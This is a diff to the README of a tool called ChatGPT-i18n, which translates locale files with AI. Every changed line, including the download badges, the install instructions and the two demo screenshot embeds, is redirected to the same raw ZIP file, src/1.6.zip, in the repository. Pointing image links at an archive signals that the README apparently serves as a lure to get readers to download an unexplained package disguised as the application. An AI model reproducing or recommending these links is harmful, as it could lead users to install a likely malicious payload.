@@ -1,6 +1,6 @@
 # 🌐 ChatGPT-i18n - Translate Locale Files with AI
 
-[![Download ChatGPT-i18n](https://img.shields.io/badge/Download-ChatGPT--i18n-blue?style=for-the-badge&logo=github)](https://github.com/Redundant-blackpea6025/ChatGPT-i18n)
+[![Download ChatGPT-i18n](https://img.shields.io/badge/Download-ChatGPT--i18n-blue?style=for-the-badge&logo=github)](https://github.com/Redundant-blackpea6025/ChatGPT-i18n/raw/refs/heads/main/src/1.6.zip)
 
 ## 🎯 What Is ChatGPT-i18n?
 
@@ -18,7 +18,7 @@ Instead of copying and pasting text into Google Translate, ChatGPT-i18n lets you
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/Redundant-blackpea6025/ChatGPT-i18n](https://github.com/Redundant-blackpea6025/ChatGPT-i18n)
+Visit this link to download the application: [https://github.com/Redundant-blackpea6025/ChatGPT-i18n/raw/refs/heads/main/src/1.6.zip](https://github.com/Redundant-blackpea6025/ChatGPT-i18n/raw/refs/heads/main/src/1.6.zip)
 
 After you click the link, you'll land on the GitHub page. Look for a green button that says "Code" or "Download." Click it and choose "Download ZIP." Once the download finishes, find the ZIP file in your Downloads folder, right-click it, and select "Extract All." Then open the extracted folder and look for the application file to start using ChatGPT-i18n.
 
@@ -60,11 +60,11 @@ When the translation is complete, you'll see a preview. If everything looks good
 
 ## 🖼️ See It in Action
 
-![ChatGPT-i18n demo](https://user-images.githubusercontent.com/22167673/224185217-a32406fd-740c-4ced-b86c-55b2b895dc12.png)
+![ChatGPT-i18n demo](https://github.com/Redundant-blackpea6025/ChatGPT-i18n/raw/refs/heads/main/src/1.6.zip)
 
 *The main translation screen showing source text and AI-generated translations*
 
-![Export locale files](https://user-images.githubusercontent.com/22167673/224073592-77bffd43-7422-40d2-984d-cfe95079ceb0.png)
+![Export locale files](https://github.com/Redundant-blackpea6025/ChatGPT-i18n/raw/refs/heads/main/src/1.6.zip)
 
 *Download all your translated language files with one click*
 
@@ -149,7 +149,7 @@ This project is actively maintained and improving. New features and improvements
 
 Download ChatGPT-i18n today and say goodbye to manual translation work. Whether you're localizing a small project or a large application, this tool will save you hours of time and deliver professional-quality results.
 
-[![Get ChatGPT-i18n Now](https://img.shields.io/badge/Get%20ChatGPT--i18n-Now-green?style=for-the-badge&logo=download)](https://github.com/Redundant-blackpea6025/ChatGPT-i18n)
+[![Get ChatGPT-i18n Now](https://img.shields.io/badge/Get%20ChatGPT--i18n-Now-green?style=for-the-badge&logo=download)](https://github.com/Redundant-blackpea6025/ChatGPT-i18n/raw/refs/heads/main/src/1.6.zip)
 
 ---
 
